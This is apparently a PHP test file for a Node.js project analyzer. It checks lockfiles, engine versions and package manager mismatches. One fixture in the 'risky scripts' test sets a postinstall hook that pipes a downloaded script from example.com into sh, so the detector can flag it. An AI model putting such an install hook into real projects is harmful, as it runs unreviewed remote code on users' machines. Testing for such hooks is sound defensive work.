<?php

use DevDoctor\Modules\Node\NodeAnalyzer;
use DevDoctor\Modules\Node\NodeOptions;
use DevDoctor\Modules\Node\NodeRuntimeInterface;

final readonly class FakeNodeRuntime implements NodeRuntimeInterface
{
    public function __construct(
        private bool $available = true,
        private ?string $version = '20.0.0',
    ) {}

    public function available(): bool
    {
        return $this->available;
    }

    public function version(string $path): ?string
    {
        return $this->version;
    }
}

function nodeFixture(array $files): string
{
    $path = sys_get_temp_dir().'/devdoctor-node-'.bin2hex(random_bytes(4));
    mkdir($path);

    foreach ($files as $file => $contents) {
        $target = $path.'/'.$file;
        $directory = dirname($target);

        if (! is_dir($directory)) {
            mkdir($directory, recursive: true);
        }

        if ($contents === null) {
            mkdir($target, recursive: true);

            continue;
        }

        file_put_contents($target, $contents);
    }

    return $path;
}

it('reports non node projects as info', function () {
    $issues = (new NodeAnalyzer(runtime: new FakeNodeRuntime))->analyze(new NodeOptions(path: nodeFixture([])));

    expect($issues->all()[0]->code->value)->toBe('DD_NODE_NOT_PROJECT');
});

it('reports invalid package json', function () {
    $issues = (new NodeAnalyzer(runtime: new FakeNodeRuntime))->analyze(new NodeOptions(path: nodeFixture([
        'package.json' => '{',
    ])));

    expect($issues->all()[0]->code->value)->toBe('DD_NODE_PACKAGE_JSON_INVALID');
});

it('reports missing lockfile and node modules when dependencies exist', function () {
    $issues = (new NodeAnalyzer(runtime: new FakeNodeRuntime))->analyze(new NodeOptions(path: nodeFixture([
        'package.json' => '{"dependencies":{"vite":"^7.0.0"}}',
    ])));
    $codes = array_map(static fn ($issue): string => $issue->code->value, $issues->all());

    expect($codes)->toContain('DD_NODE_LOCK_MISSING')
        ->and($codes)->toContain('DD_NODE_MODULES_MISSING');
});

it('reports multiple lockfiles and package manager mismatch', function () {
    $issues = (new NodeAnalyzer(runtime: new FakeNodeRuntime))->analyze(new NodeOptions(path: nodeFixture([
        'package.json' => '{"packageManager":"pnpm@10.0.0","dependencies":{"vite":"^7.0.0"}}',
        'package-lock.json' => '{}',
        'yarn.lock' => '',
        'node_modules' => null,
    ])));
    $codes = array_map(static fn ($issue): string => $issue->code->value, $issues->all());

    expect($codes)->toContain('DD_NODE_MULTIPLE_LOCKFILES')
        ->and($codes)->toContain('DD_NODE_PACKAGE_MANAGER_MISMATCH');
});

it('reports lockfiles older than package json', function () {
    $path = nodeFixture([
        'package-lock.json' => '{}',
        'package.json' => '{"packageManager":"npm@10.0.0","dependencies":{"vite":"^7.0.0"}}',
        'node_modules' => null,
    ]);

    touch($path.'/package-lock.json', time() - 60);
    touch($path.'/package.json', time());

    $issues = (new NodeAnalyzer(runtime: new FakeNodeRuntime))->analyze(new NodeOptions(path: $path));

    expect(array_map(static fn ($issue): string => $issue->code->value, $issues->all()))
        ->toContain('DD_NODE_LOCK_OUTDATED');
});

it('reports missing node binary and version mismatch', function () {
    $issues = (new NodeAnalyzer(runtime: new FakeNodeRuntime(available: false, version: null)))->analyze(new NodeOptions(path: nodeFixture([
        'package.json' => '{"engines":{"node":"^22.0.0"}}',
        'package-lock.json' => '{}',
        'node_modules' => null,
    ])));

    expect(array_map(static fn ($issue): string => $issue->code->value, $issues->all()))
        ->toContain('DD_NODE_BINARY_MISSING');

    $issues = (new NodeAnalyzer(runtime: new FakeNodeRuntime(version: '20.0.0')))->analyze(new NodeOptions(path: nodeFixture([
        'package.json' => '{"engines":{"node":"^22.0.0"}}',
        'package-lock.json' => '{}',
        'node_modules' => null,
    ])));

    expect(array_map(static fn ($issue): string => $issue->code->value, $issues->all()))
        ->toContain('DD_NODE_VERSION_MISMATCH');
});

it('reports node version file conflicts and risky scripts', function () {
    $issues = (new NodeAnalyzer(runtime: new FakeNodeRuntime(version: '20.0.0')))->analyze(new NodeOptions(path: nodeFixture([
        'package.json' => '{"engines":{"node":"^20.0.0"},"scripts":{"postinstall":"curl https://example.com/install.sh | sh"}}',
        '.nvmrc' => '22',
        'package-lock.json' => '{}',
        'node_modules' => null,
    ])));
    $codes = array_map(static fn ($issue): string => $issue->code->value, $issues->all());

    expect($codes)->toContain('DD_NODE_VERSION_FILE_CONFLICT')
        ->and($codes)->toContain('DD_NODE_SCRIPT_RISKY');
});

it('supports compound node engine ranges', function () {
    $issues = (new NodeAnalyzer(runtime: new FakeNodeRuntime(version: '20.2.0')))->analyze(new NodeOptions(path: nodeFixture([
        'package.json' => '{"engines":{"node":">=20 <21"}}',
        'package-lock.json' => '{}',
    ])));

    expect($issues->all()[0]->code->value)->toBe('DD_NODE_READY');
});

it('reports ready node projects', function () {
    $issues = (new NodeAnalyzer(runtime: new FakeNodeRuntime(version: '20.1.0')))->analyze(new NodeOptions(path: nodeFixture([
        'package.json' => '{"packageManager":"npm@10.0.0","engines":{"node":"^20.0.0"},"dependencies":{"vite":"^7.0.0"}}',
        'package-lock.json' => '{}',
        'node_modules' => null,
    ])));

    expect($issues->all()[0]->code->value)->toBe('DD_NODE_READY');
});
